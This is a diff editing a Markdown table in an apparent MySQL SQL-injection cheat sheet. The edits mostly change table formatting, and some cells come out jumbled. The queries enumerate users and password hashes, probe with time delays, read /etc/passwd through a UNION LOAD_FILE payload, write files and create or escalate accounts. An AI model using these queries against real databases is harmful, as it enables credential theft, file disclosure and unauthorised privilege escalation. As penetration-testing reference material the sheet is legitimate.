@@ -70,10 +70,11 @@ There are some of the queries below that only the `admin` user can run; in those
 
 | What I want to get| Command to Run|
 | | |
-|Version| 	SELECT @@version|
-|Comments| 	SELECT 1; #comment|
+
+|Version| 	|SELECT @@version|
+|Comments| 	|SELECT 1; #comment|
 |Current User| 	|SELECT user();|
-|		|	|SELECT system_user();|
+|Current User|		|	|SELECT system_user();|
 |List Users| 	|SELECT user FROM mysql.user; — priv|
 |List Password Hashes| 	|SELECT host, user, password FROM mysql.user; — priv|
 |List DBA Accounts| |	SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv|
@@ -83,10 +84,10 @@ There are some of the queries below that only the `admin` user can run; in those
 
 |Avoiding Quotes| 	|SELECT 0×414243; # returns ABC|
 |Time Delay| 	|SELECT BENCHMARK(1000000,MD5(‘A’));|
-|				|SELECT SLEEP(5); # >= 5.0.12|
+|# >= 5.0.12		|	|SELECT SLEEP(5); # >= 5.0.12|
 
 |Local File Access| |	…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) — priv, can only read world-readable files.|
-|| |SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system|
+|Local FileAccess | |SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system|
 |Hostname, IP Address| 	|SELECT @@hostname;|
 |Create Users| 	|CREATE USER test1 IDENTIFIED BY ‘pass1′; — priv|
 |Delete Users| 	|DROP USER test1; — priv|Make User DBA| 	|GRANT ALL PRIVILEGES ON *.* TO test1@’%'; — priv|
